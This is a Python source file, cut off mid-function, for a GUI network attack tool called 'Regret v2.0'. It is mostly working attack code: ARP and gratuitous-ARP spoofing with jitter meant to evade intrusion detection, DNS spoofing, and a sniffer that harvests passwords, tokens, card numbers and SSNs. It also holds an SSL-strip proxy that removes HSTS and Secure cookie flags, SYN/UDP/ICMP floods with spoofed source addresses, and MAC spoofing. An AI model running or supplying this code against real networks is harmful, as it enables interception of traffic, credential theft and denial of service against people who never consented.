#!/usr/bin/env python3
"""
Regret v2.0 — Network Control Tool
Author  : Syed Sadam Hussain Shah
GUI combining quiet.py (per-host ARP spoof) + garp.py (broadcast GARP)
sudo python3 regret.py
Requires: python3-scapy, python3-tk
"""

import os
import sys
import time
import random
import socket
import hashlib
import threading
import subprocess
import glob as _glob
import tkinter as tk
from tkinter import ttk, messagebox, filedialog
from scapy.all import (ARP, Ether, srp, sendp, get_if_hwaddr,
                        IP, TCP, UDP, Raw, ICMP,
                        DNS, DNSQR, DNSRR,
                        sr1, wrpcap,
                        sniff as scapy_sniff)
try:
    from scapy.all import (IPv6, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr,
                            ICMPv6NDOptSrcLLAddr)
    IPV6_OK = True
except ImportError:
    IPV6_OK = False

try:
    from scapy.all import RadioTap, Dot11, Dot11Deauth
    DOT11_OK = True
except ImportError:
    DOT11_OK = False

try:
    from scapy.all import Dot1Q
    DOT1Q_OK = True
except ImportError:
    DOT1Q_OK = False

try:
    from scapy.all import BOOTP, DHCP
    DHCP_OK = True
except ImportError:
    DHCP_OK = False

# ── Credentials — file-based, persistent ─────────────────────────────────────
import json
import queue as _queue

# ── mitmproxy (optional — needed for HSTS Strip tab) ──────────────────────────
try:
    from mitmproxy import options as _mitm_opts
    from mitmproxy.tools import dump as _mitm_dump
    import asyncio as _asyncio
    MITMPROXY_OK = True
except ImportError:
    MITMPROXY_OK = False

# Fields we consider "juicy" when seen in POST bodies
CRED_KEYS = {
    'password', 'passwd', 'pass', 'pwd', 'secret', 'credentials',
    'username', 'user', 'uname', 'userid', 'login',
    'email', 'mail', 'phone', 'mobile',
    'token', 'auth', 'bearer', 'authorization',
    'credit_card', 'card', 'ccnum', 'cc_num', 'cvv', 'cvc', 'pin',
    'ssn', 'account', 'api_key', 'apikey', 'key', 'otp', 'code',
}

_CREDS_DIR  = os.path.expanduser('~/.regret')
_CREDS_FILE = os.path.join(_CREDS_DIR, 'creds.json')

def _load_credentials() -> dict:
    """Load credentials from file. Creates default on first run."""
    if os.path.exists(_CREDS_FILE):
        try:
            with open(_CREDS_FILE, 'r') as f:
                return json.load(f)
        except Exception:
            pass
    # First run — create default (admin / regret@2024) and save immediately
    default = {'admin': hashlib.sha256(b'regret@2024').hexdigest()}
    _save_credentials(default)
    return default

def _save_credentials(creds: dict):
    """Persist credentials to disk."""
    os.makedirs(_CREDS_DIR, mode=0o700, exist_ok=True)
    with open(_CREDS_FILE, 'w') as f:
        json.dump(creds, f)
    os.chmod(_CREDS_FILE, 0o600)  # owner-read-only

def _check_credentials(username: str, password: str) -> bool:
    creds = _load_credentials()
    stored = creds.get(username.strip())
    if not stored:
        return False
    return hashlib.sha256(password.encode()).hexdigest() == stored

def _update_password(username: str, new_password: str):
    """Hash and persist a new password for username."""
    creds = _load_credentials()
    creds[username] = hashlib.sha256(new_password.encode()).hexdigest()
    _save_credentials(creds)

# ── Palette ───────────────────────────────────────────────────────────────────
BG       = '#0b0f1a'
BG2      = '#131928'
BG3      = '#1c2333'
ACCENT   = '#e63946'
ACCENT_H = '#c1121f'
GREEN    = '#2dc653'
YELLOW   = '#f4a261'
CYAN     = '#48cae4'
TEXT     = '#e8eaf0'
FG       = '#e8eaf0'
TEXT_DIM = '#6b7280'
BORDER   = '#2d3748'

# ── Network helpers ───────────────────────────────────────────────────────────

def get_interfaces():
    out = subprocess.check_output(['ip', 'link', 'show']).decode()
    ifaces = []
    for line in out.splitlines():
        if ': ' in line and not line.startswith(' '):
            name = line.split(': ')[1].split(':')[0].strip()
            if name != 'lo':
                ifaces.append(name)
    return ifaces or ['eth0']


def get_default_iface():
    try:
        out = subprocess.check_output(['ip', 'route', 'show', 'default']).decode()
        parts = out.split()
        return parts[parts.index('dev') + 1]
    except Exception:
        return 'eth0'


def get_gateway_ip():
    out = subprocess.check_output(['ip', 'route', 'show', 'default']).decode()
    return out.split()[2]


def get_local_subnets():
    """Return all connected subnets from 'ip route show'."""
    try:
        out = subprocess.check_output(['ip', 'route', 'show']).decode()
        nets = []
        for line in out.splitlines():
            parts = line.split()
            if parts and '/' in parts[0] and 'scope link' in line:
                nets.append(parts[0])
        return nets if nets else [_gw_subnet()]
    except Exception:
        return [_gw_subnet()]


def _gw_subnet():
    try:
        gw = get_gateway_ip()
        return '.'.join(gw.split('.')[:3]) + '.0/24'
    except Exception:
        return '192.168.1.0/24'


def get_mac(ip, iface):
    pkt = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip)
    answered, _ = srp(pkt, timeout=2, iface=iface, verbose=0)
    return answered[0][1].hwsrc if answered else None


def arp_scan(network, iface):
    pkt = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=network)
    answered, _ = srp(pkt, timeout=3, iface=iface, verbose=0)
    return [{'ip': r[1].psrc, 'mac': r[1].hwsrc} for _, r in answered]


def set_ip_forward(enable):
    val = '1' if enable else '0'
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as fh:
            fh.write(val)
    except Exception:
        pass
    # Allow/block forwarded packets through the kernel routing path
    policy = 'ACCEPT' if enable else 'DROP'
    subprocess.run(['iptables', '-P', 'FORWARD', policy], capture_output=True)
    # Strict rp_filter drops asymmetrically-routed MITM packets; disable when forwarding
    rp = '0' if enable else '1'
    subprocess.run(['sysctl', '-w', f'net.ipv4.conf.all.rp_filter={rp}'],     capture_output=True)
    subprocess.run(['sysctl', '-w', f'net.ipv4.conf.default.rp_filter={rp}'], capture_output=True)


# ── Host enrichment ───────────────────────────────────────────────────────────

def get_hostname(ip):
    """Reverse DNS lookup."""
    try:
        return socket.gethostbyaddr(ip)[0]
    except Exception:
        return ''


def get_netbios_name(ip):
    """NetBIOS name via nmblookup (works for Windows machines)."""
    try:
        out = subprocess.check_output(
            ['nmblookup', '-A', ip],
            timeout=4, stderr=subprocess.DEVNULL
        ).decode()
        for line in out.splitlines():
            line = line.strip()
            if '<00>' in line and 'GROUP' not in line and '<' in line:
                return line.split()[0]
    except Exception:
        pass
    return ''


def get_mac_vendor(mac):
    """
    Look up MAC vendor from OUI prefix.
    Tries nmap's prefix file first, then the ieee-data file.
    """
    if not mac or len(mac) < 8:
        return ''
    oui = mac.replace(':', '').replace('-', '').upper()[:6]
    candidates = [
        '/usr/share/nmap/nmap-mac-prefixes',
        '/usr/share/ieee-data/oui.txt',
        '/usr/share/arp-scan/ieee-oui.txt',
    ]
    for path in candidates:
        if not os.path.exists(path):
            continue
        try:
            with open(path, errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    # nmap format:  AABBCC VendorName
                    # ieee format:  AA-BB-CC   (hex)  Vendor Name
                    prefix = line.replace('-', '').replace(':', '').split()[0].upper()
                    if prefix == oui:
                        parts = line.split(None, 1)
                        return parts[1].strip()[:24] if len(parts) > 1 else ''
        except Exception:
            continue
    return ''


def fingerprint_os(ip):
    """Guess OS from ICMP reply TTL: <=64=Linux/Unix, <=128=Windows, else=Cisco/Net."""
    try:
        resp = sr1(IP(dst=ip)/ICMP(), timeout=1.5, verbose=0)
        if resp and resp.haslayer(IP):
            ttl = resp[IP].ttl
            if ttl <= 64:  return 'Linux/Unix'
            if ttl <= 128: return 'Windows'
            return 'Cisco/Net'
    except Exception:
        pass
    return ''


def get_wifi_interfaces():
    """Return list of wireless interfaces from /proc/net/wireless."""
    try:
        with open('/proc/net/wireless') as f:
            lines = f.readlines()[2:]
        return [ln.split(':')[0].strip() for ln in lines if ':' in ln]
    except Exception:
        return []


# ── Session / Profile Management ─────────────────────────────────────────────

_SESSIONS_DIR = os.path.expanduser('~/.regret/sessions')


def list_sessions():
    os.makedirs(_SESSIONS_DIR, exist_ok=True)
    return sorted(_glob.glob(os.path.join(_SESSIONS_DIR, '*.json')))


def save_session(name, data):
    os.makedirs(_SESSIONS_DIR, exist_ok=True)
    path = os.path.join(_SESSIONS_DIR, f'{name}.json')
    with open(path, 'w') as f:
        json.dump(data, f, indent=2)
    return path


def load_session(path):
    with open(path) as f:
        return json.load(f)


def delete_session(path):
    try:
        os.remove(path)
    except Exception:
        pass


def enrich_host(host):
    """Fill hostname, netbios, vendor, and OS fields in-place. Thread-safe."""
    host['hostname'] = get_hostname(host['ip'])
    host['netbios']  = get_netbios_name(host['ip'])
    host['vendor']   = get_mac_vendor(host['mac'])
    host['os']       = fingerprint_os(host['ip'])


# ── ARP operations — per-host (quiet.py) ─────────────────────────────────────

def send_spoof(target_ip, target_mac, spoof_ip, iface):
    pkt = Ether(dst=target_mac) / ARP(
        op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip
    )
    sendp(pkt, iface=iface, verbose=0)


def send_restore_unicast(target_ip, target_mac, real_ip, real_mac, iface):
    pkt = Ether(dst=target_mac) / ARP(
        op=2, pdst=target_ip, hwdst=target_mac, psrc=real_ip, hwsrc=real_mac
    )
    sendp(pkt, iface=iface, count=5, verbose=0)


# ── ARP operations — broadcast GARP (garp.py) ────────────────────────────────

def send_garp_broadcast(spoof_ip, our_mac, iface):
    pkts = [
        Ether(src=our_mac, dst='ff:ff:ff:ff:ff:ff') / ARP(
            op=1, hwsrc=our_mac, psrc=spoof_ip,
            hwdst='ff:ff:ff:ff:ff:ff', pdst=spoof_ip,
        ),
        Ether(src=our_mac, dst='ff:ff:ff:ff:ff:ff') / ARP(
            op=2, hwsrc=our_mac, psrc=spoof_ip,
            hwdst='ff:ff:ff:ff:ff:ff', pdst=spoof_ip,
        ),
    ]
    sendp(pkts, iface=iface, verbose=0)


def send_garp_unicast(target_ip, target_mac, spoof_ip, our_mac, iface):
    pkt = Ether(src=our_mac, dst=target_mac) / ARP(
        op=2, hwsrc=our_mac, psrc=spoof_ip, hwdst=target_mac, pdst=target_ip,
    )
    sendp(pkt, iface=iface, verbose=0)


def send_restore_broadcast(real_ip, real_mac, iface):
    pkts = [
        Ether(src=real_mac, dst='ff:ff:ff:ff:ff:ff') / ARP(
            op=1, hwsrc=real_mac, psrc=real_ip,
            hwdst='ff:ff:ff:ff:ff:ff', pdst=real_ip,
        ),
        Ether(src=real_mac, dst='ff:ff:ff:ff:ff:ff') / ARP(
            op=2, hwsrc=real_mac, psrc=real_ip,
            hwdst='ff:ff:ff:ff:ff:ff', pdst=real_ip,
        ),
    ]
    sendp(pkts, iface=iface, count=5, inter=0.1, verbose=0)


# ── Bandwidth (tc/HTB) ────────────────────────────────────────────────────────

def setup_htb(iface):
    subprocess.run(['tc', 'qdisc', 'del', 'dev', iface, 'root'], capture_output=True)
    subprocess.run(['tc', 'qdisc', 'add', 'dev', iface, 'root', 'handle', '1:', 'htb', 'default', '10'], check=True)
    subprocess.run(['tc', 'class', 'add', 'dev', iface, 'parent', '1:', 'classid', '1:10', 'htb', 'rate', '1000mbit'], check=True)


def add_ip_limit(iface, target_ip, classid, rate_kbps):
    subprocess.run(['tc', 'class', 'add', 'dev', iface, 'parent', '1:', 'classid', f'1:{classid}', 'htb', 'rate', f'{rate_kbps}kbit', 'burst', '15k'], check=True)
    subprocess.run(['tc', 'filter', 'add', 'dev', iface, 'protocol', 'ip', 'parent', '1:0', 'prio', '1', 'u32', 'match', 'ip', 'dst', target_ip, 'flowid', f'1:{classid}'], check=True)


def remove_ip_limit(iface, classid):
    subprocess.run(['tc', 'class', 'del', 'dev', iface, 'classid', f'1:{classid}'], capture_output=True)


def clear_bandwidth(iface):
    subprocess.run(['tc', 'qdisc', 'del', 'dev', iface, 'root'], capture_output=True)


def iptables_redirect(iface, port, enable=True):
    """Add or remove PREROUTING rules that redirect HTTP/HTTPS to the proxy port."""
    flag = '-A' if enable else '-D'
    for dport in ('80', '443'):
        subprocess.run([
            'iptables', '-t', 'nat', flag, 'PREROUTING',
            '-i', iface, '-p', 'tcp', '--dport', dport,
            '-j', 'REDIRECT', '--to-port', str(port)
        ], capture_output=True)


# ── MAC address management ────────────────────────────────────────────────────

def generate_random_mac():
    """Random locally-administered unicast MAC (LAA bit set, multicast bit clear)."""
    first = (random.randint(0x00, 0xff) & 0xFE) | 0x02
    rest  = [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{b:02x}' for b in [first] + rest)


def get_current_mac(iface):
    """Read current MAC from kernel via ip link."""
    try:
        out = subprocess.check_output(['ip', 'link', 'show', iface]).decode()
        for line in out.splitlines():
            if 'link/ether' in line:
                return line.strip().split()[1]
    except Exception:
        pass
    return get_if_hwaddr(iface)


def get_permanent_mac(iface):
    """
    Return the hardware-burned-in MAC.
    Tries ethtool -P first, then /sys/class/net fallback.
    """
    try:
        out = subprocess.check_output(
            ['ethtool', '-P', iface], stderr=subprocess.DEVNULL
        ).decode()
        for line in out.splitlines():
            if 'Permanent' in line:
                return line.split(':', 1)[1].strip()
    except Exception:
        pass
    try:
        with open(f'/sys/class/net/{iface}/address') as f:
            return f.read().strip()
    except Exception:
        pass
    return None


def apply_mac(iface, new_mac):
    """Change the MAC address using ip link (no macchanger needed)."""
    subprocess.run(['ip', 'link', 'set', 'dev', iface, 'down'],    check=True)
    subprocess.run(['ip', 'link', 'set', 'dev', iface, 'address', new_mac], check=True)
    subprocess.run(['ip', 'link', 'set', 'dev', iface, 'up'],      check=True)


# ── Attack engine ─────────────────────────────────────────────────────────────

class AttackEngine:
    def __init__(self, iface, log_fn):
        self.iface        = iface
        self.log          = log_fn
        self.gateway_ip   = None
        self.gateway_mac  = None
        self.my_mac       = None
        self._per_host    = {}
        self._garp_active = False
        self._garp_thread = None
        self._garp_hosts  = []
        self._htb_ready   = False
        self._next_cid    = 20
        self._lock        = threading.Lock()

    def init_gateway(self):
        self.gateway_ip  = get_gateway_ip()
        self.gateway_mac = get_mac(self.gateway_ip, self.iface)
        self.my_mac      = get_if_hwaddr(self.iface)
        if not self.gateway_mac:
            self.log('[-] Could not resolve gateway MAC', 'error')
            return False
        self.log(f'[*] Gateway: {self.gateway_ip} ({self.gateway_mac})', 'info')
        return True

    def start_host(self, target_ip, rate_kbps=None):
        if target_ip in self._per_host:
            return
        mac = get_mac(target_ip, self.iface)
        if not mac:
            self.log(f'[-] Cannot resolve MAC for {target_ip}', 'error')
            return
        classid = None
        if rate_kbps:
            if not self._htb_ready:
                setup_htb(self.iface)
                self._htb_ready = True
            classid = self._next_cid
            self._next_cid += 1
            add_ip_limit(self.iface, target_ip, classid, rate_kbps)
            self.log(f'[+] Bandwidth capped to {rate_kbps} kbps for {target_ip}', 'info')
        with self._lock:
            self._per_host[target_ip] = {'mac': mac, 'active': True, 'classid': classid}
        t = threading.Thread(target=self._host_loop, args=(target_ip, mac), daemon=True)
        t.start()
        self._per_host[target_ip]['thread'] = t
        self.log(f'[+] Spoofing {target_ip} ({mac})', 'success')

    def _host_loop(self, ip, mac):
        while self._per_host.get(ip, {}).get('active'):
            send_spoof(ip, mac, self.gateway_ip, self.iface)
            send_spoof(self.gateway_ip, self.gateway_mac, ip, self.iface)
            time.sleep(random.uniform(0.8, 2.2))   # jitter avoids fixed-interval IDS detection

    def stop_host(self, target_ip):
        if target_ip not in self._per_host:
            return
        with self._lock:
            self._per_host[target_ip]['active'] = False
        info = self._per_host[target_ip]
        send_restore_unicast(target_ip, info['mac'], self.gateway_ip, self.gateway_mac, self.iface)
        if info['classid']:
            remove_ip_limit(self.iface, info['classid'])
        del self._per_host[target_ip]
        self.log(f'[+] Restored ARP for {target_ip}', 'success')

    def start_garp(self, hosts, mitm=False, interval=0.5):
        if self._garp_active:
            return
        self._garp_hosts  = hosts
        self._garp_active = True
        t = threading.Thread(target=self._garp_loop, args=(interval,), daemon=True)
        t.start()
        self._garp_thread = t
        self.log(f'[+] GARP {"MITM" if mitm else "DoS"} started on {len(hosts)} host(s)', 'success')

    def _garp_loop(self, interval):
        while self._garp_active:
            send_garp_broadcast(self.gateway_ip, self.my_mac, self.iface)
            for h in self._garp_hosts:
                send_garp_unicast(h['ip'], h['mac'], self.gateway_ip, self.my_mac, self.iface)
            time.sleep(interval + random.uniform(-0.15, 0.15))   # jitter

    def stop_garp(self):
        if not self._garp_active:
            return
        self._garp_active = False
        if self._garp_thread:
            self._garp_thread.join(timeout=3)
        for h in self._garp_hosts:
            send_restore_unicast(h['ip'], h['mac'], self.gateway_ip, self.gateway_mac, self.iface)
        send_restore_broadcast(self.gateway_ip, self.gateway_mac, self.iface)
        set_ip_forward(False)
        self.log('[+] GARP stopped — ARP restored on all hosts', 'success')

    def stop_all(self):
        for ip in list(self._per_host.keys()):
            self.stop_host(ip)
        self.stop_garp()
        if self._htb_ready:
            clear_bandwidth(self.iface)
            self._htb_ready = False
        set_ip_forward(False)


# ── Hostname helpers ──────────────────────────────────────────────────────────

def get_current_hostname():
    return socket.gethostname()


def set_hostname(new_name):
    """Change hostname via hostnamectl and patch /etc/hosts."""
    old = get_current_hostname()
    subprocess.run(['hostnamectl', 'set-hostname', new_name], check=True)
    # Update /etc/hosts: replace old hostname with new one
    try:
        with open('/etc/hosts', 'r') as f:
            content = f.read()
        content = content.replace(old, new_name)
        with open('/etc/hosts', 'w') as f:
            f.write(content)
    except Exception:
        pass


# ── DNS Spoof engine ─────────────────────────────────────────────────────────

class DNSSpoofEngine:
    """
    Intercepts UDP/53 packets on the interface and replies with spoofed A records
    for any domain matching a rule in self.rules {domain_substr: redirect_ip}.
    Requires MITM (ip_forward) so DNS queries actually flow through us.
    """
    def __init__(self, iface, log_cb):
        self.iface    = iface
        self.log      = log_cb
        self.rules    = {}      # domain_substr -> redirect_ip
        self._stop    = threading.Event()
        self._thread  = None

    def start(self):
        if self._thread and self._thread.is_alive():
            return
        self._stop.clear()
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()
        self.log('[+] DNS Spoof started', 'success')

    def _loop(self):
        def handle(pkt):
            if self._stop.is_set():
                return
            if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0 and pkt.haslayer(DNSQR)):
                return
            try:
                qname = pkt[DNSQR].qname.decode('utf-8', errors='ignore').rstrip('.')
            except Exception:
                return
            for domain, redir_ip in list(self.rules.items()):
                if domain.lower() in qname.lower():
                    resp = (IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                            UDP(dport=pkt[UDP].sport, sport=53) /
                            DNS(id=pkt[DNS].id, qr=1, aa=1, rd=1, ra=1,
                                qd=pkt[DNS].qd,
                                an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10,
                                         type='A', rdata=redir_ip)))
                    from scapy.all import send as scapy_send
                    scapy_send(resp, iface=self.iface, verbose=0)
                    self.log(f'[DNS] {qname} → {redir_ip}', 'success')
                    return
        try:
            scapy_sniff(iface=self.iface, filter='udp port 53',
                        prn=handle,
                        stop_filter=lambda _: self._stop.is_set(),
                        store=False)
        except Exception as e:
            self.log(f'[-] DNS sniff error: {e}', 'error')

    def stop(self):
        self._stop.set()
        self.log('[*] DNS Spoof stopped', 'warn')


# ── Packet Sniffer engine ─────────────────────────────────────────────────────

class SnifferEngine:
    """
    Passive Scapy sniffer — parses HTTP requests and DNS queries flowing through
    the interface and fires pkt_cb with a tuple:
        (timestamp, src_ip, dst_ip, protocol, info_str, cred_str)
    """
    def __init__(self, iface, log_cb, pkt_cb):
        self.iface     = iface
        self.log       = log_cb
        self.pkt_cb    = pkt_cb
        self._stop     = threading.Event()
        self._thread   = None
        self._pcap_buf = []   # raw packets for PCAP export

    def start(self, bpf=''):
        if self._thread and self._thread.is_alive():
            return
        self._pcap_buf.clear()
        self._stop.clear()
        self._thread = threading.Thread(target=self._loop, args=(bpf,), daemon=True)
        self._thread.start()
        self.log('[+] Sniffer started', 'success')

    def save_pcap(self, path):
        """Write buffered packets to a .pcap file. Returns True on success."""
        try:
            wrpcap(path, self._pcap_buf)
            return True
        except Exception:
            return False

    def _loop(self, bpf):
        def handle(pkt):
            if self._stop.is_set():
                return
            self._pcap_buf.append(pkt)   # buffer every packet for export
            row = self._parse(pkt)
            if row:
                self.pkt_cb(row)
        try:
            scapy_sniff(iface=self.iface,
                        filter=bpf or 'tcp or udp port 53',
                        prn=handle,
                        stop_filter=lambda _: self._stop.is_set(),
                        store=False)
        except Exception as e:
            self.log(f'[-] Sniffer error: {e}', 'error')

    def _parse(self, pkt):
        if not pkt.haslayer(IP):
            return None
        src = pkt[IP].src
        dst = pkt[IP].dst
        ts  = time.strftime('%H:%M:%S')

        # DNS queries
        if (pkt.haslayer(DNS) and pkt.haslayer(DNSQR)
                and pkt[DNS].qr == 0):
            try:
                qname = pkt[DNSQR].qname.decode('utf-8', errors='ignore').rstrip('.')
            except Exception:
                qname = '?'
            return (ts, src, dst, 'DNS', f'Query: {qname}', '')

        # HTTP plaintext
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            try:
                text = pkt[Raw].load.decode('utf-8', errors='ignore')
            except Exception:
                return None
            if not text[:5] in ('GET /', 'POST ', 'PUT /', 'HEAD ', 'PATCH'):
                return None
            lines    = text.split('\r\n')
            req_line = lines[0][:80]
            host     = next((l[6:].strip() for l in lines
                             if l.lower().startswith('host:')), dst)
            creds    = ''
            # scan POST body for credential keys
            if 'POST' in lines[0] and '\r\n\r\n' in text:
                body = text.split('\r\n\r\n', 1)[1][:300]
                for key in CRED_KEYS:
                    if key in body.lower():
                        creds = body
                        break
            return (ts, src, dst, 'HTTP', f'{req_line}  [{host}]', creds)

        # FTP / Telnet plaintext credentials
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            try:
                text = pkt[Raw].load.decode('utf-8', errors='ignore').strip()
            except Exception:
                return None
            dport = pkt[TCP].dport
            if dport in (21, 23) and text:
                proto = 'FTP' if dport == 21 else 'TELNET'
                return (ts, src, dst, proto, text[:80], '')

        return None

    def stop(self):
        self._stop.set()
        self.log('[*] Sniffer stopped', 'warn')


# ── SSL Strip / HSTS Downgrade ───────────────────────────────────────────────

class SSLStripAddon:
    """
    mitmproxy addon that:
      • Strips Strict-Transport-Security headers from every response
      • Rewrites https:// → http:// in HTML/JS bodies
      • Extracts credentials from HTTP POST form and JSON bodies
      • Reports all traffic via callbacks to the GUI
    """

    def __init__(self, cred_cb, traffic_cb):
        self._cred_cb    = cred_cb
        self._traffic_cb = traffic_cb

    # ── Outgoing requests ─────────────────────────────────────────────────────

    def request(self, flow):
        from mitmproxy.net.http import http1   # noqa — imported lazily
        method = flow.request.method
        host   = flow.request.pretty_host
        path   = flow.request.path
        ct     = flow.request.headers.get('content-type', '')
        scheme = flow.request.scheme

        self._traffic_cb(method, host, path, ct, scheme)

        if method != 'POST':
            return

        # ── Form-urlencoded ───────────────────────────────────────────────────
        if 'urlencoded' in ct or 'form' in ct:
            try:
                from urllib.parse import parse_qs
                body   = flow.request.get_text(strict=False)
                params = parse_qs(body, keep_blank_values=True)
                found  = {k: v[0] for k, v in params.items()
                          if any(s in k.lower() for s in CRED_KEYS) and v}
                if found:
                    self._cred_cb(host, path, found, scheme)
            except Exception:
                pass

        # ── JSON body ─────────────────────────────────────────────────────────
        if 'json' in ct:
            try:
                import json as _j
                body = _j.loads(flow.request.get_text(strict=False))
                if isinstance(body, dict):
                    found = {k: str(v) for k, v in body.items()
                             if any(s in k.lower() for s in CRED_KEYS)}
                    if found:
                        self._cred_cb(host, path, found, scheme)
            except Exception:
                pass

    # ── Incoming responses ────────────────────────────────────────────────────

    def response(self, flow):
        # 1 — Strip headers that enforce HTTPS
        for hdr in ('Strict-Transport-Security',
                    'Content-Security-Policy',
                    'X-Content-Type-Options'):
            flow.response.headers.pop(hdr, None)

        # 2 — Rewrite https links inside HTML and JS bodies
        ct = flow.response.headers.get('content-type', '')
        if any(x in ct for x in ('text/html', 'text/javascript', 'application/javascript')):
            try:
                text = flow.response.get_text(strict=False)
                text = text.replace('https://', 'http://')
                text = text.replace('HTTPS://', 'http://')
                # Strip secure cookie attribute so session cookies work over HTTP
                text = text.replace(' Secure;', '')
                text = text.replace(' secure;', '')
                flow.response.set_text(text)
            except Exception:
                pass


class SSLStripEngine:
    """Manages the mitmproxy transparent proxy thread and iptables rules."""

    def __init__(self, iface, port, cred_cb, traffic_cb, log_cb):
        self.iface       = iface
        self.port        = port
        self._cred_cb    = cred_cb
        self._traffic_cb = traffic_cb
        self.log         = log_cb
        self._master     = None
        self._loop       = None
        self._thread     = None
        self._active     = False

    def start(self):
        if self._active:
            return
        if not MITMPROXY_OK:
            self.log(
                '[-] mitmproxy not installed — run:  pip install mitmproxy', 'error')
            return

        iptables_redirect(self.iface, self.port, enable=True)
        self.log(f'[+] iptables: ports 80 + 443 → {self.port}', 'success')

        # Disable ICMP redirects so forwarded packets don't bounce back
        for key in ('all', 'default'):
            try:
                with open(f'/proc/sys/net/ipv4/conf/{key}/send_redirects', 'w') as f:
                    f.write('0')
            except Exception:
                pass

        addon = SSLStripAddon(self._cred_cb, self._traffic_cb)

        def _run():
            self._loop = _asyncio.new_event_loop()
            _asyncio.set_event_loop(self._loop)

            async def _async_run():
                opts = _mitm_opts.Options(
                    listen_host='0.0.0.0',
                    listen_port=self.port,
                    mode=['transparent'],
                    ssl_insecure=True,
                )
                self._master = _mitm_dump.DumpMaster(
                    opts, with_termlog=False, with_dumper=False)
                self._master.addons.add(addon)
                try:
                    async with self._master:
                        await self._master.run()
                except Exception:
                    pass

            self._loop.run_until_complete(_async_run())
            self._loop.close()

        self._active = True
        self._thread = threading.Thread(target=_run, daemon=True, name='sslstrip')
        self._thread.start()
        self.log(f'[+] SSL Strip proxy running on :{self.port}', 'success')
        self.log('[*] Make sure Attack tab → MITM mode is active', 'warn')

    def stop(self):
        if not self._active:
            return
        self._active = False
        if self._master and self._loop:
            try:
                self._loop.call_soon_threadsafe(self._master.shutdown)
            except Exception:
                pass
        iptables_redirect(self.iface, self.port, enable=False)
        self.log('[*] SSL Strip stopped — iptables rules removed', 'warn')


# ── Stress Test engine ───────────────────────────────────────────────────────

class StressEngine:
    """
    Packet flood engine.
      hping3 mode : subprocess — fastest, uses the real hping3 binary
      Scapy mode  : pure-Python multi-threaded fallback, no extra binary needed
    """

    def __init__(self, iface, log_cb, stats_cb):
        self.iface       = iface
        self.log         = log_cb
        self.stats_cb    = stats_cb   # fn(total_pkts, pps, elapsed, engine_str)
        self._stop_evt   = threading.Event()
        self._threads    = []
        self._counter    = [0]
        self._start_ts   = 0.0
        self._active     = False
        self._proc       = None

    # ── hping3 ────────────────────────────────────────────────────────────────

    def _hping3_ok(self):
        return subprocess.run(['which', 'hping3'],
                              capture_output=True).returncode == 0

    def start_hping3(self, target_ip, target_port, mode, spoof):
        if not self._hping3_ok():
            self.log('[-] hping3 not found — sudo apt install hping3 -y', 'error')
            return False

        cmd = ['hping3', '--flood']
        if   mode == 'syn':  cmd += ['--syn',  '-p', str(target_port)]
        elif mode == 'udp':  cmd += ['--udp',  '-p', str(target_port)]
        elif mode == 'icmp': cmd += ['--icmp']
        elif mode == 'ack':  cmd += ['--ack',  '-p', str(target_port)]
        elif mode == 'fin':  cmd += ['--fin',  '-p', str(target_port)]
        if spoof:
            cmd += ['--rand-source']
        cmd.append(target_ip)

        self._active     = True
        self._start_ts   = time.time()
        self._stop_evt.clear()
        self._counter[0] = 0

        try:
            self._proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, preexec_fn=os.setsid
            )
        except Exception as e:
            self.log(f'[-] hping3 launch error: {e}', 'error')
            return False

        threading.Thread(target=self._hping3_reader, daemon=True).start()
        threading.Thread(target=self._timer_loop,    daemon=True).start()
        self.log(
            f'[+] hping3 {mode.upper()} flood → {target_ip}:{target_port}'
            f'{"  [rand-source]" if spoof else ""}', 'success')
        return True

    def _hping3_reader(self):
        import re
        for line in self._proc.stdout:
            line = line.strip()
            if not line:
                continue
            m = re.search(r'(\d+)\s+packets?\s+tramitted', line)
            if m:
                self._counter[0] = int(m.group(1))
            self.log(f'[hping3]  {line}', 'info')
        self._active = False

    def _timer_loop(self):
        while self._active and not self._stop_evt.is_set():
            time.sleep(0.5)
            self.stats_cb(self._counter[0], 0,
                          time.time() - self._start_ts, 'hping3')

    # ── Scapy ─────────────────────────────────────────────────────────────────

    def start_scapy(self, target_ip, target_port, mode, spoof,
                    num_threads, pkt_size):
        self._active     = True
        self._start_ts   = time.time()
        self._stop_evt.clear()
        self._counter[0] = 0

        dispatch = {
            'syn':  (self._syn_worker,  (target_ip, target_port, spoof, pkt_size)),
            'udp':  (self._udp_worker,  (target_ip, target_port, spoof, pkt_size)),
            'icmp': (self._icmp_worker, (target_ip, spoof, pkt_size)),
            'http': (self._http_worker, (target_ip, target_port)),
        }
        fn, args = dispatch.get(mode, dispatch['syn'])

        for _ in range(num_threads):
            t = threading.Thread(target=fn, args=args, daemon=True)
            t.start()
            self._threads.append(t)

        threading.Thread(target=self._scapy_stats_loop, daemon=True).start()
        self.log(
            f'[+] Scapy {mode.upper()} flood → {target_ip}:{target_port}'
            f'  threads={num_threads}  pkt={pkt_size}B'
            f'{"  [rand-src]" if spoof else ""}', 'success')

    def _syn_worker(self, tip, tport, spoof, size):
        from scapy.all import IP, TCP, Raw, send
        pay = Raw(b'S' * max(0, size - 40))
        while not self._stop_evt.is_set():
            try:
                src = (f'{random.randint(1,254)}.{random.randint(0,255)}.'
                       f'{random.randint(0,255)}.{random.randint(1,254)}'
                       ) if spoof else None
                base = IP(src=src, dst=tip) if src else IP(dst=tip)
                send(base / TCP(sport=random.randint(1024, 65535),
                                dport=tport, flags='S') / pay, verbose=0)
                self._counter[0] += 1
            except Exception:
                pass

    def _udp_worker(self, tip, tport, spoof, size):
        from scapy.all import IP, UDP, Raw, send
        pay = Raw(b'U' * max(0, size - 28))
        while not self._stop_evt.is_set():
            try:
                src = (f'{random.randint(1,254)}.{random.randint(0,255)}.'
                       f'{random.randint(0,255)}.{random.randint(1,254)}'
                       ) if spoof else None
